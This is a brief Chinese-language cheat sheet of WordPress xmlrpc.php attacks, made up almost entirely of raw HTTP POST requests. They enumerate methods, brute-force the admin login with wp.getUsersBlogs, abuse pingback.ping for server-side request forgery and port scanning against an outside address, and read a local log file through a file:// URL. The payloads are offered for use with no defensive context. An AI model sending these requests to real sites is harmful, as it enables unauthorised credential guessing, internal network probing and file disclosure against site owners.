# xmlrpc.php 漏洞利用

### 0x01 查看系统允许的方法

```bash
POST /wordpress/xmlrpc.php HTTP/1.1
Host: www.example.com
Content-Length: 99

<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```

### 0x02 账号爆破

无限提交

```bash
POST /wordpress/xmlrpc.php HTTP/1.1
Host: www.example.com
Content-Length: 99

<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>password</value></param>
</params>
</methodCall>
```

### 0x03 SSRF

WordPress 版本 <3.5.1, 通过 Pingback 可以实现的服务器端请求伪造 (Server-side request forgery，SSRF) 和远程端口扫描。

```bash
POST /wordpress/xmlrpc.php HTTP/1.1
Host: www.example.com
Content-Length: 99

<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://x.x.x.x:8000测试地址</string></value>
</param><param><value><string>https://localhost/?p=6461wordpress上存在的一url</string>
</value></param></params>
</methodCall>
```

### 0x04 读取文件

```bash
POST /wordpress/xmlrpc.php HTTP/1.1
Host: www.example.com
Content-Length: 99

<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>file:///var/log/apache2/access_log</string></value>
</param><param><value><string>http://localhost/?p=6461</string>
</value></param></params>
</methodCall>
```
